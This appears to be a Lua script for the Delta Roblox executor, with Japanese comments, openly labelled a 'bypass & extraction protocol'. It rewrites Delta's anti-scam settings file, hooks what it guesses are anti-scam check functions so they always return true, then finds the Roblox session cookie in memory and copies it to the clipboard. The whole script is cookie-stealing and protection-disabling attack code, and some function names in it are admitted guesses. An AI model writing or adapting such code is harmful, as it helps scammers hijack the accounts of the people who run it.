-- "" Delta Silent Bypass & Extraction Protocol ""

local function silent_patch()
    -- 1. ファイルの永続書き換え (次回の起動も安泰にする)
    local path = "Delta/Internals/Secured/disableantiscam"
    if isfile(path) then
        local my_id = readfile("Delta/Internals/Secured/user_id")
        local payload = {
            ["WARNING"] = "IF SOMEONE TELLS YOU TO PUT ANYTH...", 
            ["allowed_games"] = "*",
            ["user_id"] = my_id,
            ["version_num"] = 707 -- 画像にあった最新の構造に合わせる
        }
        writefile(path, game:GetService("HttpService"):JSONEncode(payload))
        print("[+] File patched for persistence.")
    end

    -- 2. メモリ上のアンチスキャンを直接「黙らせる」 (再起動不要)
    -- getgc で Delta のセキュリティチェック関数を特定してフック
    for _, v in pairs(getgc()) do
        if type(v) == "function" and is_delta_closure(v) then
            local info = getinfo(v)
            if info.name == "check_scam" or info.name == "antiscam_verify" then -- 予測される関数名
                hookfunction(v, function() return true end) -- 常に「安全」と返させる
                print("[+] Memory hook injected. Anti-scam is now silent.")
            end
        end
    end

    -- 3. トドメのクッキー抜き取り
    task.wait(0.5) -- 書き換えの安定を待つ
    local objects = getgc(true)
    for _, v in pairs(objects) do
        if type(v) == "string" and string.find(v, "_|WARNING:-DO-NOT-SHARE-") then
            setclipboard(v)
            print("[!] TARGET ELIMINATED: Cookie sent to clipboard.")
            return
        end
    end
end

silent_patch()
